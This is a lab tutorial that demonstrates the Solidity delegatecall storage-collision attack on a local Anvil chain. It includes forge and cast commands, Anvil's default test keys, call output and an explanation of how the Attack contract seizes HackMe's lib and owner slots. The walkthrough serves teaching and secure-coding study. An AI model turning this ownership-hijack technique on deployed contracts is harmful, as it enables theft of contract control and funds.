## Delegatecall Vulnerability

**Reference:** https://solidity-by-example.org/hacks/delegatecall/

This demonstrates a sophisticated **delegatecall vulnerability** where mismatched storage layouts between contracts allow an attacker to hijack ownership by manipulating which contract gets called via delegatecall.

### 🎯 The Vulnerability

**The Problem:** When using `delegatecall`, the called contract's code executes in the context of the calling contract's storage. If the storage layouts don't match, variables can be overwritten in unexpected ways!

**In this attack:**
- `HackMe` has storage: `lib` (slot 0), `owner` (slot 1), `someNumber` (slot 2)
- `Lib` has storage: `someNumber` (slot 0)
- When `HackMe` delegatecalls `Lib.doSomething()`, it writes to `HackMe`'s slot 0 (the `lib` variable!)

---

### 🚀 Setup

**Start Anvil (local blockchain)**

```bash
anvil
```

---

### 👥 Step 1: Alice Deploys Contracts

**Alice's Details:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

#### Deploy Lib Contract

```bash
forge create src/delegateCall/DelegateCall.sol:Lib\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

#### Deploy HackMe Contract

```bash
forge create src/delegateCall/DelegateCall.sol:HackMe\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3

  # Contract deployed to: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
```

#### Verify Initial State

**Check owner (should be Alice):**

```bash
cast call 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 "owner()"
# 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266 ✓
```

---

### 😈 Step 2: Eve Deploys Attack Contract

**Eve's Details:**
- Address: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`
- Private Key: `0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d`

```bash
forge create src/delegateCall/DelegateCall.sol:Attack\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --broadcast \
  --constructor-args 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512

  # Contract deployed to: 0x8464135c8F25Da09e49BC8782676a84730C318bC
```

#### Verify Lib Address Before Attack

```bash
cast call 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 "lib()"
# 0x0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
# Points to Lib contract ✓
```

---

### ⚔️ Step 3: Execute the Attack

```bash
cast send 0x8464135c8F25Da09e49BC8782676a84730C318bC \
  "attack()" \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

---

### 🔍 Verify Attack Success

#### Check Lib Address (Now Compromised!)

```bash
cast call 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 "lib()"
# 0x0000000000000000000000008464135c8f25da09e49bc8782676a84730c318bc
# Now points to Attack contract! ✅
```

#### Check Owner Address (Now Compromised!)

```bash
cast call 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 "owner()"
# 0x0000000000000000000000008464135c8f25da09e49bc8782676a84730c318bc
# Now points to Attack contract! ✅
```

---

### 🎯 Attack Successful!

Both critical variables have been hijacked:
- ✅ `lib` = Attack contract address
- ✅ `owner` = Attack contract address

**Eve now controls HackMe through the Attack contract!**

---

### 🔍 How the Attack Works

#### The Setup

**Storage Layout Mismatch:**

```solidity
// Lib contract
contract Lib {
    uint256 public someNumber;  // slot 0
}

// HackMe contract  
contract HackMe {
    address public lib;         // slot 0 ← Different variable!
    address public owner;       // slot 1
    uint256 public someNumber;  // slot 2
}
```

#### The Attack Flow

**1️⃣ First `doSomething()` Call:**

```solidity
hackMe.doSomething(uint256(uint160(address(this))));
```

- Converts Attack contract address to uint256
- HackMe delegatecalls to Lib.doSomething()
- Lib's code: `someNumber = _num` (writes to slot 0)
- **But in HackMe's storage, slot 0 is `lib`!**
- Result: `lib` is now set to Attack contract address ✅

**2️⃣ Second `doSomething()` Call:**

```solidity
hackMe.doSomething(1);
```

- HackMe tries to delegatecall to `lib`
- **But `lib` now points to the Attack contract!**
- So it calls `Attack.doSomething(1)` via delegatecall
- Attack's code: `owner = msg.sender`
- `msg.sender` = Attack contract (because Attack called HackMe)
- Result: `owner` is now set to Attack contract address ✅

#### Why Owner Becomes Attack Contract (Not Eve)?

When `Attack.attack()` executes:
- Eve calls `Attack.attack()`
- Attack calls `HackMe.doSomething()` ← **regular call**
- Inside HackMe, `msg.sender` = **Attack contract address** (not Eve!)
- HackMe delegatecalls to Attack.doSomething()
- Delegatecall **preserves** `msg.sender` from the calling context
- So `owner = msg.sender` sets owner to the **Attack contract**

